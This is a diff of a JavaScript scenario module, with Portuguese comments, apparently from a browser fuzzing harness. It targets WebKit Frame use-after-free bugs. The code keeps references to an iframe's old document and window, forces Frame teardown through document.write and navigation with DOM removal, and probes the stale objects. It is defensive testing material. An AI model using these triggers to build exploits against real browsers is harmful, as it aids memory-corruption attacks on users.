@@ -1,112 +1,112 @@
 /**
- * SC_IFRAME_FRAME_UAF.JS
- * Categoria : DOM — Use-After-Free (WindowProxy)
- * Alvo      : WebCore::LocalFrame / WindowProxy C++ lifecycle
- * Técnica   : Obtém referência ao contentWindow de um iframe,
- *             navega o iframe para about:blank (libera o Frame C++),
- *             e então tenta acessar o WindowProxy stale.
- *             O WindowProxy JS deve redirecionar, mas o Frame C++
- *             subjacente pode já ter sido coletado.
- * Referência: CVE-2021-30661, CVE-2022-32893 (WebKit frame UAF)
+ * CENÁRIO: IFRAME_DOCWRITE_FRAME_UAF
+ * Superfície C++: FrameLoader.cpp / Frame.cpp / DocumentWriter.cpp
+ * Risco: HIGH
+ *
+ * Diferença para a versão genérica:
+ *   - Versão anterior fazia document.write() na mesma origem, onde o WebKit
+ *     pode reutilizar o Frame em vez de destruir e recriar — sem UAF real.
+ *   - Versão robusta testa dois vetores de teardown do Frame:
+ *     (A) navigate para about:blank (destrói Frame atual, cria novo)
+ *     (B) document.write() com conteúdo que muda o charset (força parser reset)
+ *   - Captura refs para oldDoc e oldWin ANTES do teardown, então faz
+ *     probes extensivas para detectar acesso ao Frame antigo freed.
+ *   - Adiciona probes em propriedades de navegação (history, location)
+ *     que apontam diretamente para estruturas C++ do Frame.
+ *   - Usa iframe removido do DOM durante o navigate (double free path).
+ *
+ * Ciclo de vida C++ relevante:
+ *   iframe.src = 'about:blank' → FrameLoader::load() → Frame antigo destroyed
+ *   oldDoc ainda referenciado pelo JS → Document::m_frame (freed Frame*)
+ *   oldWin.location → acessa LocalDOMWindow::m_frame (freed Frame*)
  */
 
 export default {
-    id:          'IFRAME_DOCWRITE_FRAME_UAF',
-    category:    'DOM',
-    risk:        'HIGH',
-    description: 'WindowProxy stale após navegação do iframe. '
-                + 'Testa acesso ao Frame C++ liberado via referência JS retida.',
+    id:       'IFRAME_DOCWRITE_FRAME_UAF',
+    category: 'DOM',
+    risk:     'HIGH',
+    description:
+        'document.write() e navigate forçam teardown do Frame nativo. ' +
+        'Refs JS para oldDoc/oldWin retidas pré-teardown acessam Frame freed. ' +
+        'Testa document.write() com charset-reset e navigate para about:blank. ' +
+        'Probes em location, history e navigator apontam para structs C++ do Frame.',
 
-    /* ── estado interno ──────────────────────────────────────────────── */
-    _iframe:      null,
-    _win:         null,
-    _doc:         null,
-    _divRef:      null,
-    _container:   null,
-
-    supported: function() {
-        return typeof document !== 'undefined';
-    },
-
-    /* ── setup ──────────────────────────────────────────────────────── */
     setup: async function() {
-        this._container = document.createElement('div');
-        document.body.appendChild(this._container);
+        this.iframe = document.createElement('iframe');
+        this.iframe.style.cssText = 'width:200px;height:100px;position:absolute;top:0;left:0';
+        document.body.appendChild(this.iframe);
 
-        this._iframe = document.createElement('iframe');
-        this._iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
-        this._container.appendChild(this._iframe);
-
-        // Aguarda load do iframe
-        await new Promise(r => {
-            this._iframe.onload = r;
-            this._iframe.src = 'about:blank';
+        // Aguarda iframe carregar para garantir que o Frame C++ está inicializado
+        await new Promise(resolve => {
+            if (this.iframe.contentDocument?.readyState === 'complete') return resolve();
+            this.iframe.addEventListener('load', resolve, { once: true });
+            this.iframe.src = 'about:blank';
         });
 
-        // Guarda referências ao frame original
-        this._win = this._iframe.contentWindow;
-        this._doc = this._iframe.contentDocument;
+        // Captura referências ANTES do teardown — essas vão ser as "dangling refs"
+        this.oldWin = this.iframe.contentWindow;
+        this.oldDoc = this.iframe.contentDocument;
 
-        // Escreve conteúdo e obtém referência a um nó interno
+        // Cria alguns nós no documento original para testar acesso pós-free
         try {
-            this._doc.open();
-            this._doc.write('<div id="canary">original test</div>');
-            this._doc.close();
-            this._divRef = this._doc.getElementById('canary');
-        } catch(_) {}
-
-        await new Promise(r => setTimeout(r, 20));
+            this.oldDoc.body.innerHTML = '<div id="orig">original</div><span>test</span>';
+            this.origEl = this.oldDoc.getElementById('orig');
+        } catch(e) {}
     },
 
-    /* ── trigger ─────────────────────────────────────────────────────── */
     trigger: async function() {
-        // Navega o iframe — libera o Frame/Document C++ originais
-        await new Promise(r => {
-            this._iframe.onload = r;
-            this._iframe.src = 'about:blank';
-        });
-
-        // Re-escreve conteúdo diferente (novo frame, novo Document)
+        // VETOR A: document.write() com charset diferente — força DocumentWriter reset
         try {
-            this._iframe.contentDocument.open();
-            this._iframe.contentDocument.write('<div id="canary">REWRITTEN</div>');
-            this._iframe.contentDocument.close();
-        } catch(_) {}
+            this.oldDoc.open('text/html', 'replace');
+            this.oldDoc.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head>'
+                + '<body><p id="new">REWRITTEN</p></body></html>');
+            this.oldDoc.close();
+        } catch(e) {}
 
         await new Promise(r => setTimeout(r, 20));
+
+        // VETOR B: navigate para nova URL — destrói Frame e cria outro
+        // Remove do DOM durante o navigate (double free path)
+        this.iframe.src = 'about:blank#fuzztarget';
+        this.iframe.remove(); // Remove durante o navigate
+
+        await new Promise(r => setTimeout(r, 30));
     },
 
-    /* ── probes ──────────────────────────────────────────────────────── */
     probe: [
-        // [0-3] WindowProxy stale — deve redirecionar para novo frame
-        s => s._win?.location?.href  ?? 'null',
-        s => s._win?.document?.readyState ?? 'null',
-        s => typeof s._win,
-        s => s._win === s._iframe.contentWindow,
+        // Acesso ao Document antigo freed via oldDoc
+        s => s.oldDoc.readyState,
+        s => s.oldDoc.URL,
+        s => s.oldDoc.documentURI,
+        s => s.oldDoc.characterSet,
+        s => s.oldDoc.contentType,
+        s => s.oldDoc.body?.innerHTML,
+        s => s.oldDoc.body?.childElementCount,
+        s => s.oldDoc.documentElement?.outerHTML?.length,
+        s => s.oldDoc.getElementById?.('new'),       // Elemento do documento reescrito
+        s => s.oldDoc.getElementById?.('orig'),      // Elemento do documento ANTIGO
+        s => s.oldDoc.querySelector?.('p')?.id,
+        s => s.oldDoc.title,
+        s => s.oldDoc.cookie,
 
-        // [4-5] Document stale
-        s => s._doc?.readyState ?? 'null',
-        s => s._doc?.URL ?? 'null',
+        // Acesso à Window antiga freed via oldWin
+        // location e history apontam para structs C++ do Frame
+        s => s.oldWin.location?.href,
+        s => s.oldWin.location?.origin,
+        s => s.oldWin.history?.length,
+        s => s.oldWin.closed,
+        s => s.oldWin.name,
 
-        // [6-8] nó do documento original — após remoção pode ser UAF
-        s => s._divRef?.textContent ?? 'null',
-        s => s._divRef?.isConnected ?? false,
-        s => s._divRef?.ownerDocument === s._doc,
+        // Verifica se o documento mudou (indica que a ref apontou para o novo Frame)
+        s => s.oldWin.document === s.iframe.contentDocument,
 
-        // [9] novo frame tem o conteúdo certo?
-        s => s._iframe.contentDocument?.getElementById('canary')?.textContent ?? 'null',
-
-        // [10] iframe ainda conectado
-        s => s._iframe.isConnected,
+        // Acesso ao nó original — pode estar em heap freed
+        s => s.origEl?.isConnected,
+        s => s.origEl?.ownerDocument === s.oldDoc,
+        s => s.origEl?.getRootNode(),
     ],
 
-    /* ── cleanup ─────────────────────────────────────────────────────── */
-    cleanup: async function() {
-        this._container?.remove();
-        this._container = null;
-        this._iframe    = null;
-        this._win       = null;
-        this._doc       = null;
-        this._divRef    = null;
+    cleanup: function() {
+        try { this.iframe.remove(); } catch(e) {}
     }
 };
